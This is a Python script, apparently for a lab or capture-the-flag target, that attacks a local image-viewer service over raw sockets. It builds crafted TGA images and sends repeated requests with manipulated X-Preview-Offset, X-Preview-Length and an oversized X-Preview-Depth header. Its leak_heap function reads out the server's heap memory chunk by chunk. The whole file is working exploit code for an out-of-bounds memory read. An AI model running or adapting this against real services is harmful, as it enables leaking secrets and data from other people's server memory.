#!/usr/bin/env python3
"""Raw-socket client + heap chunk walker for the local image-viewer service."""
import socket, struct, sys

HOST, PORT = "127.0.0.1", 8097

def build_request(headers, body, method="POST", path="/process"):
    req = f"{method} {path} HTTP/1.1\r\nHost: x\r\n" + "".join(f"{k}: {v}\r\n" for k, v in headers) + "\r\n"
    return req.encode() + body

def send_raw(headers, body, method="POST", path="/process", timeout=8, halfclose=True):
    req = build_request(headers, body, method, path)
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(req)
        if halfclose:
            try: s.shutdown(socket.SHUT_WR)
            except OSError: pass
        out = b""
        while True:
            try: d = s.recv(65536)
            except socket.timeout: break
            if not d: break
            out += d
        s.close()
        return out
    except Exception as e:
        return b"<<ERR %s>>" % str(e).encode()

def parse(resp):
    head, sep, body = resp.partition(b"\r\n\r\n")
    return head, body

def tga_rle_raw(npix, pix=b"\x11\x22\x33"):
    out = b""; n = npix
    while n > 0:
        k = min(128, n)
        out += bytes([k - 1]) + pix * k
        n -= k
    return out

def tga(w, h, bpp=24, imgtype=2, desc=0, x=0, y=0, idlen=0, cmap=0,
        cmap_entries=0, cmap_bpp=0, payload=None):
    hdr = struct.pack("<BBBHHBHHHHBB", idlen, cmap, imgtype, 0, cmap_entries,
                      cmap_bpp, x, y, w, h, bpp, desc)
    hdr += b"A" * idlen
    if payload is None:
        payload = b"\x11" * (w * h * (bpp // 8))
    return hdr + payload

def leak_heap(headers, body, start=0, chunk=1024, maxbytes=0x40000, halfclose=True):
    """Return (data, end_offset_or_None)."""
    data = bytearray()
    off = start
    while off < start + maxbytes:
        h = list(headers) + [("X-Preview-Offset", str(off)),
                             ("X-Preview-Length", str(chunk)),
                             ("X-Preview-Depth", "2000000000")]
        resp = send_raw(h, body, halfclose=halfclose)
        head, b = parse(resp)
        if len(b) != chunk:
            return bytes(data), off
        data += b
        off += chunk
    return bytes(data), None

if __name__ == "__main__":
    print("sanity:", send_raw([("X-Preview-Length", "0")], tga(4, 4))[:80])
